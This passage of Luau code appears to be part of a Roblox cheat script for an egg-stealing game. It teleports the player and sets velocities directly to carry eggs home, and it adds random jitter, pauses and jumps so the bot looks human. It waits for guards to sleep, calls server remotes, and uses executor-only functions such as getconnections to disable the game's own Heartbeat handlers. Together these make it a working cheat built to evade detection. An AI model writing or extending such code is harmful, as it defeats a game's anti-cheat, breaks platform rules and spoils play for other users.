					return string.find(lowerName, "portal", 1, true) or string.find(lowerName, "teleport", 1, true) or string.find(lowerName, "mech", 1, true) or string.find(lowerName, "arena", 1, true) or string.find(lowerName, "scramble", 1, true)
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Folder")) and isDangerZone(child.Name) then
						if child:IsA("Folder") then
							for _, child2 in ipairs(child:GetChildren()) do
								addDangerZone(child2)
							end
						else
							addDangerZone(child)
						end
					end
				end

				local world = workspace:FindFirstChild("World")
				world = world and world:FindFirstChild("Build")

				if world then
					for _, child in ipairs(world:GetChildren()) do
						if isDangerZone(child.Name) then
							for _, child2 in ipairs(child:GetChildren()) do
								addDangerZone(child2)
							end
						end
					end
				end

				safeCarry.Dangers = dangers
				return dangers
			end

			chilliState.SafeCarry.Avoid = function(startPos, targetPos)
				for _, danger in ipairs(chilliState.SafeCarry.RefreshDangers()) do
					local minX = danger.MinX - 12
					local maxX = danger.MaxX + 12
					local minZ = danger.MinZ - 12
					local maxZ = danger.MaxZ + 12
					local axes = { { startPos.X, targetPos.X - startPos.X, minX, maxX }, { startPos.Z, targetPos.Z - startPos.Z, minZ, maxZ } }
					local intersects = true
					local tNear = 0
					local tFar = 1

					for _, axisData in ipairs(axes) do
						local origin = axisData[1]
						local delta = axisData[2]
						local boxMin = axisData[3]
						local boxMax = axisData[4]

						if math.abs(delta) < 1e-06 then
							if origin < boxMin or origin > boxMax then
								intersects = false
							end
						else
							local t1 = (boxMin - origin) / delta
							local t2 = (boxMax - origin) / delta
							local tMin, tMax

							if t1 > t2 then
								tMin = t2
								tMax = t1
							else
								tMin = t1
								tMax = t2
							end

							local newTNear = math.max(tNear, tMin)
							local newTFar = math.min(tFar, tMax)

							if newTNear > newTFar then
								intersects = false
								tNear = newTNear
								tFar = newTFar
							else
								tNear = newTNear
								tFar = newTFar
							end
						end
					end

					if intersects and not (startPos.X >= minX and startPos.X <= maxX and startPos.Z >= minZ and startPos.Z <= maxZ) then
						local detourZ1 = minZ - 2
						local detourZ2 = maxZ + 2
						local bestDetourZ = math.abs(startPos.Z - detourZ1) <= math.abs(startPos.Z - detourZ2) and detourZ1 or detourZ2

						if bestDetourZ < -440 or bestDetourZ > -290 then
							bestDetourZ = bestDetourZ == detourZ1 and detourZ2 or detourZ1
						end

						local bestDetourX = math.abs(startPos.X - minX) <= math.abs(startPos.X - maxX) and minX or maxX

						if math.abs(startPos.Z - bestDetourZ) < 3 then
							bestDetourX = math.abs(targetPos.X - minX) <= math.abs(targetPos.X - maxX) and minX or maxX
						end

						return Vector3.new(bestDetourX, targetPos.Y, bestDetourZ), danger.Name
					end
				end

				return targetPos, nil
			end

			chilliState.SafeCarry.NewHuman = function(isReturnTrip)
				local safeCarry = chilliState.SafeCarry
				local laneOffset = safeCarry.LaneOffset
				local profile

				profile = {
					Clock = 0,
					Factor = 1,
					Target = 1,
					NextShift = 0,
					Phase = math.random() * 3.1415926535897931 * 2,
					Period = 2 + math.random() * 2.5,
					PauseUntil = 0,
					Lane = (math.random() * 2 - 1) * laneOffset,
					Step = function(deltaTime, humanoid, allowJumping)
						profile.Clock = profile.Clock + deltaTime

						if profile.NextShift <= profile.Clock then
							profile.NextShift = profile.Clock + 0.5 + math.random()
							local jitterAmount = math.max(safeCarry.SpeedJitter, 0)

							if isReturnTrip then
								profile.Target = 1 - math.random() * jitterAmount
							else
								profile.Target = 1 + (math.random() * 2 - 1) * jitterAmount
							end
						end

						profile.Factor = profile.Factor + (profile.Target - profile.Factor) * math.min(deltaTime * 3, 1)
						local wobble = safeCarry.Wobble
						local wobbleOffset = math.sin(profile.Clock * 2 * 3.1415926535897931 / profile.Period + profile.Phase) * wobble
						allowJumping = allowJumping and humanoid and safeCarry.JumpsPerMinute > 0

						if allowJumping then
							local jumpChance = safeCarry.JumpsPerMinute / 60 * deltaTime
							allowJumping = math.random() < jumpChance
						end

						if allowJumping then
							pcall(function()
								humanoid.Jump = true
							end)
						end

						local isPaused = false

						if not isReturnTrip then
							if profile.Clock < profile.PauseUntil then
								isPaused = true
							else
								local allowPauses = safeCarry.PausesPerMinute > 0

								if allowPauses then
									local pauseChance = safeCarry.PausesPerMinute / 60 * deltaTime
									allowPauses = math.random() < pauseChance
								end

								if allowPauses then
									profile.PauseUntil = profile.Clock + 0.3 + math.random() * 0.9
									isPaused = true
								end
							end
						end

						return profile.Factor, profile.Lane + wobbleOffset, isPaused
					end,
				}

				return profile
			end

			chilliState.SafeCarry.React = function(minVal, maxVal)
				local clampedMin = math.max(0, math.min(minVal, maxVal))
				local clampedMax = math.max(minVal, maxVal, 0)
				return clampedMin + math.random() * (clampedMax - clampedMin)
			end

			chilliState.SafeCarry.RunTo = function(targetData, sessionId)
				local safeCarry = chilliState.SafeCarry
				local targetPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not targetPos then
					return false
				end
				cleanupFlight()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false

					if character:FindFirstChildWhichIsA("Tool") then
						pcall(function()
							humanoid:UnequipTools()
						end)
					end
				end

				local humanProfile = safeCarry.NewHuman(false)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				local safeZoneX = world and world:IsA("BasePart") and world.Position.X or 552
				local homePos = chilliState.StealHome()
				local rootPart = chilliState.Root()
				local runState = "field"
				local targetZ = rootPart and rootPart.Position.Z or targetPos.Z

				if rootPart and homePos and rootPart.Position.X < safeZoneX - 2 then
					local homeZ = homePos.Z

					if (Vector3.new(rootPart.Position.X, 0, rootPart.Position.Z) - Vector3.new(homePos.X, 0, homePos.Z)).Magnitude > 20 then
						runState = "safe"
					end

					targetZ = homeZ
				end

				local laneZ = math.clamp(targetZ + humanProfile.Lane, -425, -300)
				local runY = targetPos.Y + 3

				local function snapToHeight(targetY)
					local currentRoot = chilliState.Root()
					local character = localPlayer.Character
					local isInvalid = not currentRoot or not character or math.abs(currentRoot.Position.Y - targetY) < 1

					if not isInvalid then
						local snapLimit = safeCarry.SnapLimit
						isInvalid = math.abs(currentRoot.Position.Y - targetY) > snapLimit
					end

					if isInvalid then
						return false
					end

					pcall(function()
						local rotation = currentRoot.CFrame.Rotation
						character:PivotTo(CFrame.new(Vector3.new(currentRoot.Position.X, targetY, currentRoot.Position.Z)) * rotation)
						currentRoot.AssemblyLinearVelocity = Vector3.new(currentRoot.AssemblyLinearVelocity.X, 0, currentRoot.AssemblyLinearVelocity.Z)
					end)

					return true
				end

				local function applyRunHeight()
					if safeCarry.RunHeight <= 0.5 then
						return
					end
					snapToHeight(runY + safeCarry.RunHeight)
				end

				if runState == "field" then
					applyRunHeight()
				end

				local startTime = os.clock()
				local lastMoveTime = os.clock()
				local lastStuckTime = os.clock()
				local lastPos = rootPart and rootPart.Position or nil

				local function calculateMovement(currentRoot, targetPoint, speedFactor, isFinalApproach)
					local dirVector = Vector3.new(targetPoint.X - currentRoot.Position.X, 0, targetPoint.Z - currentRoot.Position.Z)
					local dist = dirVector.Magnitude
					local dirUnit = dist > 0.01 and dirVector.Unit or Vector3.zero

					if safeCarry.RunHeight > 0.5 and runState == "field" and not isFinalApproach then
						local runSpeed = safeCarry.RunSpeed
						local maxFlightSpeed = math.max(chilliState.WalkSpeed() * runSpeed * speedFactor, 8)
						local climbShare = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local distToTarget = Vector3.new(targetPos.X - currentRoot.Position.X, 0, targetPos.Z - currentRoot.Position.Z).Magnitude

						if distToTarget <= 3 then
							if snapToHeight(runY) then
								return
							end
						end

						local targetFlightHeight = distToTarget <= 3 and runY or runY + safeCarry.RunHeight
						if math.abs(targetFlightHeight - currentRoot.Position.Y) > 2 and snapToHeight(targetFlightHeight) then
							return
						end
						local flightYVel = math.clamp((targetFlightHeight - currentRoot.Position.Y) / 0.12, -maxFlightSpeed * climbShare, maxFlightSpeed * climbShare)
						local flightXZVel = dirUnit * math.min(math.sqrt(math.max(maxFlightSpeed * maxFlightSpeed - flightYVel * flightYVel, 0)), dist / 0.05)

						pcall(function()
							currentRoot.AssemblyLinearVelocity = Vector3.new(flightXZVel.X, flightYVel, flightXZVel.Z)
						end)

						return
					end

					pcall(function()
						if isFinalApproach or dist <= 0.01 then
							if humanoid then
								if safeCarry.RunStyle == "Walk" then
									humanoid:MoveTo(currentRoot.Position)
								end

								humanoid:Move(Vector3.zero, false)
							end

							if safeCarry.RunStyle ~= "Walk" then
								currentRoot.AssemblyLinearVelocity = Vector3.new(0, currentRoot.AssemblyLinearVelocity.Y, 0)
							end
						elseif safeCarry.RunStyle == "Walk" then
							if humanoid then
								humanoid:MoveTo(currentRoot.Position + dirUnit * math.min(dist, 30))
							end
						else
							local runSpeed = safeCarry.RunSpeed
							local walkXZVel = dirUnit * math.min(math.max(chilliState.WalkSpeed() * runSpeed * speedFactor, 8), dist / 0.05)
							currentRoot.AssemblyLinearVelocity = Vector3.new(walkXZVel.X, currentRoot.AssemblyLinearVelocity.Y, walkXZVel.Z)

							if safeCarry.RunAnimate and humanoid then
								humanoid:Move(dirUnit, false)
							end
						end
					end)
				end

				while os.clock() - startTime < 240 do
					if shouldCancelSteal(sessionId) then
						return false
					end
					local currentRoot = chilliState.Root()
					if not currentRoot then
						return false
					end
					local tickTime = os.clock()
					local dt = math.max(tickTime - lastMoveTime, 0.0041666666666666666)
					local dirToEggXZ = Vector3.new(targetPos.X - currentRoot.Position.X, 0, targetPos.Z - currentRoot.Position.Z)
					if runState == "field" and dirToEggXZ.Magnitude <= 2.5 and (safeCarry.RunHeight <= 0.5 or currentRoot.Position.Y - runY < 4) then
						break
					end
					local speedFactor, currentLaneOffset, isPaused = humanProfile.Step(dt, humanoid, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)

					if dirToEggXZ.Magnitude <= 15 then
						isPaused = false
					end

					local avoidTarget = targetPos

					if runState == "safe" and homePos then
						if (Vector3.new(homePos.X, 0, homePos.Z) - Vector3.new(currentRoot.Position.X, 0, currentRoot.Position.Z)).Magnitude <= 6 then
							runState = "field"
							applyRunHeight()
						end

						actionStatus = "Walking out to the safe zone"
						avoidTarget = homePos
					else
						if not safeCarry.StraightRun and safeCarry.RunHeight <= 0.5 and math.abs(targetPos.X - currentRoot.Position.X) > 25 then
							avoidTarget = Vector3.new(targetPos.X, targetPos.Y, math.clamp(laneZ + currentLaneOffset, -425, -300))
						end

						actionStatus = string.format("Running to the egg, %d studs left", math.floor(dirToEggXZ.Magnitude + 0.5))
					end

					local avoidPos, avoidObstacleName = safeCarry.Avoid(currentRoot.Position, avoidTarget)

					if avoidObstacleName then
						actionStatus = "Walking around " .. tostring(avoidObstacleName)
					end

					calculateMovement(currentRoot, avoidPos, speedFactor, isPaused)

					if tickTime - lastStuckTime >= 1.5 then
						if not isPaused and lastPos and (currentRoot.Position - lastPos).Magnitude < 3 and humanoid then
							pcall(function()
								humanoid.Jump = true
							end)
						end

						lastPos = currentRoot.Position
						lastStuckTime = tickTime
					end

					RunService.Heartbeat:Wait()
					lastMoveTime = tickTime
				end

				local currentRoot = chilliState.Root()

				if currentRoot then
					calculateMovement(currentRoot, currentRoot.Position, 1, true)
				end

				local standbyPos = nil

				if currentRoot then
					local distVector = Vector3.new(currentRoot.Position.X - targetPos.X, 0, currentRoot.Position.Z - targetPos.Z)
					local distOffsetVector = distVector.Magnitude > 0.1 and distVector.Unit * 2 or Vector3.zero
					standbyPos = Vector3.new(targetPos.X + distOffsetVector.X, currentRoot.Position.Y, targetPos.Z + distOffsetVector.Z)
				end

				local standbyConnection = RunService.Heartbeat:Connect(function()
					local currentRootInner = chilliState.Root()
					if not currentRootInner or not standbyPos or chilliState.Steal.Carrying or chilliState.AntiGuard.Busy then
						return
					end
					local offsetDiff = Vector3.new(standbyPos.X - currentRootInner.Position.X, 0, standbyPos.Z - currentRootInner.Position.Z)

					pcall(function()
						if offsetDiff.Magnitude > 1.5 then
							local rotation = currentRootInner.CFrame.Rotation
							currentRootInner.CFrame = CFrame.new(standbyPos.X, currentRootInner.Position.Y, standbyPos.Z) * rotation
						end

						currentRootInner.AssemblyLinearVelocity = Vector3.new(0, math.min(currentRootInner.AssemblyLinearVelocity.Y, 0), 0)
					end)
				end)

				local function cleanupStandby(result)
					standbyConnection:Disconnect()
					return result
				end

				local areaGuard = findAreaGuard(targetData)
				local waitStartTime = os.clock()
				local randomWaitReact = safeCarry.React(safeCarry.ReactMin, safeCarry.ReactMax)

				while true do
					if shouldCancelSteal(sessionId) then
						return (cleanupStandby(false))
					else
						local waitedTime = os.clock() - waitStartTime
						local totalWaitNeeded = safeCarry.RunWait + randomWaitReact
						local isGuardSleepingNow = not safeCarry.WaitGuard or not areaGuard or areaGuard:GetAttribute("GuardState") == "Sleeping"
						if waitedTime >= totalWaitNeeded and (isGuardSleepingNow or waitedTime >= totalWaitNeeded + 15) then
							break
						end
						actionStatus = waitedTime < totalWaitNeeded and string.format("Waiting before the grab, %.1fs", totalWaitNeeded - waitedTime) or "Waiting for the guard to sleep"
						RunService.Heartbeat:Wait()
					end
				end

				actionStatus = "Taking the egg"
				local grabbedSuccess = antiGuardGrabEgg(targetData, sessionId, 0.8, nil)

				if not grabbedSuccess and not shouldCancelSteal(sessionId) then
					grabbedSuccess = interactAndGrabEgg(targetData, sessionId)
				end

				cleanupStandby()
				if not grabbedSuccess then
					return false
				end
				chilliState.Steal.LastFinishedAt = os.clock()
				return true
			end

			chilliState.SafeCarry.Pace = function()
				local paceFactor = tonumber(chilliState.SafeCarry.RunSpeed) or 1
				return math.max(chilliState.WalkSpeed() * paceFactor, 16)
			end

			chilliState.SafeCarry.Plan = function(targetData, sessionId, weightFactor)
				local safeCarry = chilliState.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				local baseWalkSpeed = chilliState.WalkSpeed()
				weightFactor = weightFactor or safeCarry.Mult or 1

				if safeCarry.SameSpeedBigEggs then
					weightFactor = math.max(weightFactor, safeCarry.LightMult)
				end

				local adjustedWait = baseWalkSpeed * safeCarry.CarryRatio * weightFactor
				local fastWait = adjustedWait * safeCarry.SpeedRatio
				local excessWait = safeCarry.ExcessSeconds * adjustedWait
				local targetWait

				if sessionId and sessionId > excessWait then
					targetWait = math.min(fastWait, adjustedWait * sessionId / (sessionId - excessWait))
				else
					targetWait = fastWait
				end

				local guards = gameModules.Guards
				local guardData = type(guards) == "table" and type(guards.Directory) == "table" and guards.Directory[tostring(targetData)] or nil
				local guardSpeed = type(guardData) == "table" and tonumber(guardData.WalkSpeed) or 0
				if not safeCarry.BeatGuard then
					return math.max(math.min(adjustedWait * safeCarry.EasyRatio, targetWait), adjustedWait), true, adjustedWait, targetWait, guardSpeed
				end
				local minBeatWait = math.max(guardSpeed + safeCarry.GuardMargin, adjustedWait * safeCarry.MinRatio)
				local clampedBeatWait = math.max(minBeatWait, guardSpeed * safeCarry.GuardRatio)

				if targetWait < minBeatWait then
					local baseFastWait = adjustedWait * safeCarry.SpeedRatio
					local baseStretchWait = safeCarry.StretchSeconds * adjustedWait
					local stretchTarget

					if sessionId and sessionId > baseStretchWait then
						stretchTarget = math.min(baseFastWait, adjustedWait * sessionId / (sessionId - baseStretchWait))
					else
						stretchTarget = baseFastWait
					end

					local guardBeatTarget = guardSpeed + math.max(safeCarry.GuardMargin, 1)
					if guardBeatTarget <= stretchTarget then
						return guardBeatTarget, true, adjustedWait, stretchTarget, guardSpeed
					end
				end

				return math.max(math.min(clampedBeatWait, targetWait), adjustedWait), minBeatWait <= targetWait, adjustedWait, targetWait, guardSpeed
			end

			chilliState.SafeCarry.Unsafe = function(targetData)
				local safeCarry = chilliState.SafeCarry
				if not safeCarry.Enabled or type(targetData) ~= "table" or not targetData.Uid or not safeCarry.Blocked[targetData.Uid] then
					return nil
				end
				return string.format("the guard caught you with this %s before, skipping it", tostring(targetData.Category))
			end

			chilliState.SafeCarry.Settle = function(sessionId, targetData)
				local safeCarry = chilliState.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				math.max(chilliState.WalkSpeed() * safeCarry.CarryRatio * (safeCarry.Seen[tostring(targetData.Category)] or safeCarry.GuessMult) * safeCarry.WaitRate, 1)
				local baseWait = safeCarry.BaseWait
				local areaGuard = findAreaGuard(targetData)

				while true do
					if shouldCancelSteal(sessionId) then
						return false
					else
						local settledTime = os.clock() - (safeCarry.JumpAt or 0)
						local isGuardSleeping = not safeCarry.WaitGuard or not areaGuard or areaGuard:GetAttribute("GuardState") == "Sleeping"
						if settledTime >= baseWait and (isGuardSleeping or settledTime >= baseWait + 15) then
							break
						end

						if settledTime < baseWait then
							actionStatus = string.format("Letting the jump settle, %.1fs", baseWait - settledTime)
						else
							actionStatus = "Waiting for the guard to sleep"
						end

						RunService.Heartbeat:Wait()
					end
				end

				return true
			end

			chilliState.MonitorAction = chilliState.MonitorAction or function(func)
				local ok, constants = pcall(debug.getconstants, func)
				if not ok or type(constants) ~= "table" then
					return false
				end

				for _, const in pairs(constants) do
					local isMatch = type(const) == "string"

					if isMatch then
						isMatch = const == "Relocate" or const == "SetWalkSpeed" or const == "BeginRagdoll" or const == "EndRagdoll" or const == "BeginImpulse"
					end

					if isMatch then
						return true
					end
				end

				return false
			end

			chilliState.SafeCarry.LineDropHome = function(sessionId)
				local safeCarry = chilliState.SafeCarry
				local steal = chilliState.Steal
				local targetUid = steal.CarryUid
				local homePos = chilliState.StealHome()
				local rootPart = chilliState.Root()
				if type(targetUid) ~= "string" or not homePos or not rootPart then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				local safeZoneX = world and world:IsA("BasePart") and world.Position.X or 552.2
				local safeZoneY = world and world:IsA("BasePart") and world.Position.Y or 67.67
				local disabledConnections = {}

				pcall(function()
					for _, event in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
						for _, conn in ipairs(getconnections(event)) do
							local ok, connFunc = pcall(function()
								return conn.Function
							end)

							if ok and type(connFunc) == "function" then
								local ok2, funcSource = pcall(debug.info, connFunc, "s")

								if ok2 and string.find(tostring(funcSource), "UGI", 1, true) and not chilliState.MonitorAction(connFunc) then
									local ok3, connEnabled = pcall(function()
										return conn.Enabled
									end)

									if not ok3 or connEnabled ~= false then
										if pcall(function()
											conn:Disable()
										end) then
											table.insert(disabledConnections, conn)
										end
									end
								end
							end
						end
					end
				end)

				local didRelocate = false
				local relocateConn = nil

				pcall(function()
					relocateConn = networking["RE/RigSync/Refresh"].OnClientEvent:Connect(function(eventData)
						if type(eventData) == "table" and eventData.Action == "Relocate" then
							didRelocate = true
						end
					end)
				end)

				local currentCamera = workspace.CurrentCamera
				local cameraState = nil

				local function lockCamera()
					if cameraState or not currentCamera then
						return
					end
					cameraState = { Type = currentCamera.CameraType, CFrame = currentCamera.CFrame }

					pcall(function()
						currentCamera.CameraType = Enum.CameraType.Scriptable
						currentCamera.CFrame = cameraState.CFrame
					end)
				end

				local function unlockCamera()
					if not cameraState or not currentCamera then
						return
					end
					local prevState = cameraState
					cameraState = nil

					pcall(function()
						currentCamera.CameraType = prevState.Type
					end)
				end

				local function cleanupLineDrop()
					unlockCamera()

					if relocateConn then
						relocateConn:Disconnect()
						relocateConn = nil
					end

					for _, conn in ipairs(disabledConnections) do
						pcall(function()
							conn:Enable()
						end)
					end

					table.clear(disabledConnections)
				end

				local startTime = os.clock()

				local function driveLineDropVelocity(targetPos, speed, timeout, checkCallback)
					local waitTicks = 0

					while waitTicks < timeout and not shouldCancelSteal(sessionId) do
						local currentRoot = chilliState.Root()
						if not currentRoot then
							return false
						end

						if checkCallback and checkCallback() then
							return true
						end
						local dirToTarget = Vector3.new(targetPos.X - currentRoot.Position.X, 0, targetPos.Z - currentRoot.Position.Z)
						if dirToTarget.Magnitude < 2.5 then
							return true
						end
						local velVector = dirToTarget.Unit * math.min(speed, dirToTarget.Magnitude / 0.05)

						pcall(function()
							currentRoot.AssemblyLinearVelocity = Vector3.new(velVector.X, currentRoot.AssemblyLinearVelocity.Y, velVector.Z)
						end)

						waitTicks += RunService.Heartbeat:Wait()
					end

					return false
				end

				stopFlightVelocity()
				local lineZ = math.clamp(rootPart.Position.Z, -425, -300)
				local lineDropPos = Vector3.new(safeZoneX + (safeCarry.Hops and safeCarry.HopStop or safeCarry.LineGap), safeZoneY + 3.35, lineZ)

				local function getSnapshotRecord()
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")

					local ok, result = pcall(function()
						return rfEggWorldAskFieldEggSnapshot:InvokeServer()
					end)

					local records = ok and type(result) == "table" and result.Records or nil

					if type(records) == "table" then
						for _, record in pairs(records) do
							if type(record) == "table" and record.Uid == targetUid then
								return record
							end
						end
					end

					return nil
				end

				local distToLine = Vector3.new(rootPart.Position.X - safeZoneX, 0, rootPart.Position.Z - lineZ).Magnitude
				local max = math.max
				local carryRatio = safeCarry.CarryRatio
				local effectiveSpeed = max(chilliState.WalkSpeed() * carryRatio * (tonumber(safeCarry.Mult) or safeCarry.LightMult), 1)
				local directMargin = safeCarry.DirectMargin
				local crossingTimeNeeded = math.max(0, (distToLine - safeCarry.DirectBudget) / effectiveSpeed) + directMargin

				if safeCarry.CrossNow then
					crossingTimeNeeded = safeCarry.DirectMargin
				end

				local function teleportToLineDropPos()
					local currentRoot = chilliState.Root()
					if not currentRoot then
						return
					end

					pcall(function()
						currentRoot.CFrame = CFrame.new(lineDropPos) * CFrame.Angles(0, 1.5707963267948966, 0)
						currentRoot.AssemblyLinearVelocity = Vector3.zero
						currentRoot.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				lockCamera()

				if safeCarry.Hops then
					local currentRoot = chilliState.Root()

					if currentRoot then
						local hopY = currentRoot.Position.Y + safeCarry.HopLift
						local hopX = currentRoot.Position.X
						local hopRatio = safeCarry.HopRatio
						local hopStepSize = math.max(chilliState.WalkSpeed() * hopRatio, 40)

						while hopX - hopStepSize > lineDropPos.X and steal.Carrying and not shouldCancelSteal(sessionId) do
							hopX -= hopStepSize
							actionStatus = string.format("Line Drop: hopping home, X %d", math.floor(hopX))
							local hopWaitTicks = 0

							while hopWaitTicks < safeCarry.HopGap do
								local innerRoot = chilliState.Root()

								if innerRoot then
									pcall(function()
										innerRoot.CFrame = CFrame.new(hopX, hopY, lineZ) * CFrame.Angles(0, 1.5707963267948966, 0)
										innerRoot.AssemblyLinearVelocity = Vector3.zero
										innerRoot.AssemblyAngularVelocity = Vector3.zero
									end)
								end

								hopWaitTicks += RunService.Heartbeat:Wait()
							end
						end
					end
				end

				actionStatus = "Line Drop: landing next to the line"
				teleportToLineDropPos()

				if safeCarry.Hops and steal.Carrying then
					local dropWaitTicks = 0

					while dropWaitTicks < safeCarry.DropDelay and steal.Carrying and not shouldCancelSteal(sessionId) do
						dropWaitTicks += RunService.Heartbeat:Wait()
					end

					if steal.Carrying then
						actionStatus = "Line Drop: dropping the egg next to the line"
						local eggState = gameModules.EggState

						if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
							pcall(eggState.DropFieldEgg, "PlayerRequest")
						end

						local postDropWaitTicks = 0

						while steal.Carrying and postDropWaitTicks < 1 and not shouldCancelSteal(sessionId) do
							postDropWaitTicks += RunService.Heartbeat:Wait()
						end
					end
				end

				unlockCamera()

				if safeCarry.ShakeTime > 0 then
					local shakeInsidePos = Vector3.new(safeZoneX - safeCarry.ShakeInside, lineDropPos.Y, lineZ)
					local shakeToggle = false
					local shakeWaitTicks = 0

					while shakeWaitTicks < safeCarry.ShakeTime and steal.Carrying and not shouldCancelSteal(sessionId) do
						actionStatus = "Line Drop: shaking at the line"
						shakeToggle = not shakeToggle
						local currentRoot = chilliState.Root()

						if currentRoot then
							pcall(function()
								currentRoot.CFrame = CFrame.new(shakeToggle and shakeInsidePos or lineDropPos) * CFrame.Angles(0, 1.5707963267948966, 0)
								currentRoot.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						shakeWaitTicks += RunService.Heartbeat:Wait()
					end

					teleportToLineDropPos()
				end

				local willCrossEarly = crossingTimeNeeded < safeCarry.LineWait
				local lineWaitTicks = 0
				local rejumpAttempts = 1

				while true do
					local shouldWaitAtLine = steal.Carrying and lineWaitTicks < safeCarry.LineWait

					if shouldWaitAtLine then
						shouldWaitAtLine = not (willCrossEarly and lineWaitTicks >= crossingTimeNeeded)
					end

					if shouldWaitAtLine and not shouldCancelSteal(sessionId) then
						if willCrossEarly then
							actionStatus = string.format("Line Drop: stepping over the line in %.1fs", math.max(crossingTimeNeeded - lineWaitTicks, 0))
						else
							actionStatus = string.format("Line Drop: crossing needs %.1fs, waiting for the guard, %.0fs left", crossingTimeNeeded, safeCarry.LineWait - lineWaitTicks)
						end

						if didRelocate and safeCarry.ReJump and rejumpAttempts < 40 and not isRagdolled() then
							didRelocate = false
							rejumpAttempts += 1
							actionStatus = "Line Drop: pulled back, jumping to the line again"
							teleportToLineDropPos()
						end

						lineWaitTicks += RunService.Heartbeat:Wait()
						continue
					end

					break
				end

				if steal.Carrying and willCrossEarly and lineWaitTicks >= crossingTimeNeeded and not shouldCancelSteal(sessionId) then
					actionStatus = "Line Drop: stepping over the line"
					local crossRatio = safeCarry.CrossRatio

					driveLineDropVelocity(homePos, chilliState.WalkSpeed() * crossRatio, 6, function()
						return safeCarry.LastDelivered >= startTime or not steal.Carrying
					end)

					local postCrossWaitTicks = 0

					while postCrossWaitTicks < 1.5 and safeCarry.LastDelivered < startTime and steal.Carrying and not shouldCancelSteal(sessionId) do
						postCrossWaitTicks += RunService.Heartbeat:Wait()
					end

					if safeCarry.LastDelivered >= startTime then
						cleanupLineDrop()
						return true
					end
				end

				if steal.Carrying then
					cleanupLineDrop()
					actionStatus = "Line Drop: the guard never came, dropping the egg"
					local eggState = gameModules.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end

					return false
				end

				if safeCarry.GetUp then
					task.spawn(function()
						local getUpWaitTicks = 0

						while getUpWaitTicks < 1.5 do
							local character = localPlayer.Character
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")

							if humanoid then
								pcall(function()
									humanoid.PlatformStand = false
									local state = humanoid:GetState()

									if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
										humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
									end
								end)
							end

							getUpWaitTicks += RunService.Heartbeat:Wait()
						end
					end)
				end

				local waitForGetUpTicks = 0

				while not safeCarry.SnapPickup and not safeCarry.GetUp and isPlayerRagdolled() and waitForGetUpTicks < 6 and not shouldCancelSteal(sessionId) do
					actionStatus = "Line Drop: egg is down at the line, getting up"
					waitForGetUpTicks += RunService.Heartbeat:Wait()
				end

				local pickupAttempts = 0

				while not shouldCancelSteal(sessionId) and pickupAttempts < 4 do
					pickupAttempts += 1
					local fetchedPos = fetchEggBottomCFrame(targetUid)

					if not fetchedPos then
						cleanupLineDrop()
						actionStatus = "Line Drop: the egg is gone"
						return false
					end

					local snapshotRecord = getSnapshotRecord()

					if snapshotRecord and snapshotRecord.State == "Slot" then
						cleanupLineDrop()
						actionStatus = "Line Drop: the egg went back to its nest"
						return false
					end

					actionStatus = "Line Drop: picking the egg up at the line"
					local pickupTimeout

					if safeCarry.SnapPickup then
						local currentRoot = chilliState.Root()

						if currentRoot then
							pcall(function()
								currentRoot.CFrame = CFrame.new(fetchedPos + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
								currentRoot.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						pickupTimeout = 5
					else
						local pickupRatio = safeCarry.PickupRatio
						driveLineDropVelocity(fetchedPos, chilliState.WalkSpeed() * pickupRatio, 5)
						pickupTimeout = 2.5
					end

					local pickupWaitTicks = 0

					while not steal.Carrying and pickupWaitTicks < pickupTimeout and not shouldCancelSteal(sessionId) do
						task.spawn(sendCarryEggRequest, targetUid)

						if safeCarry.SnapPickup then
							local innerRoot = chilliState.Root()

							if innerRoot and Vector3.new(innerRoot.Position.X - fetchedPos.X, 0, innerRoot.Position.Z - fetchedPos.Z).Magnitude > 6 then
								pcall(function()
									innerRoot.CFrame = CFrame.new(fetchedPos + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
								end)
							end
						end

						pickupWaitTicks += task.wait(0.15)
					end

					if steal.Carrying and not steal.WrongEgg(targetUid) then
						break
					end
				end

				if not steal.Carrying then
					cleanupLineDrop()
					actionStatus = "Line Drop: could not pick the egg up again"
					return false
				end

				local currentRoot = chilliState.Root()

				if currentRoot and currentRoot.Position.X - safeZoneX > safeCarry.FarFromLine then
					cleanupLineDrop()
					actionStatus = "Line Drop: egg ended up far from the line, carrying it home safely"
					return chilliState.SafeCarry.Home(sessionId)
				end

				actionStatus = "Line Drop: stepping over the line"
				local crossRatio = safeCarry.CrossRatio

				driveLineDropVelocity(homePos, chilliState.WalkSpeed() * crossRatio, 6, function()
					return safeCarry.LastDelivered >= startTime or not steal.Carrying
				end)

				local currentRootEnd = chilliState.Root()

				if currentRootEnd then
					pcall(function()
						currentRootEnd.AssemblyLinearVelocity = Vector3.new(0, currentRootEnd.AssemblyLinearVelocity.Y, 0)
					end)
				end

				local finalWaitTicks = 0

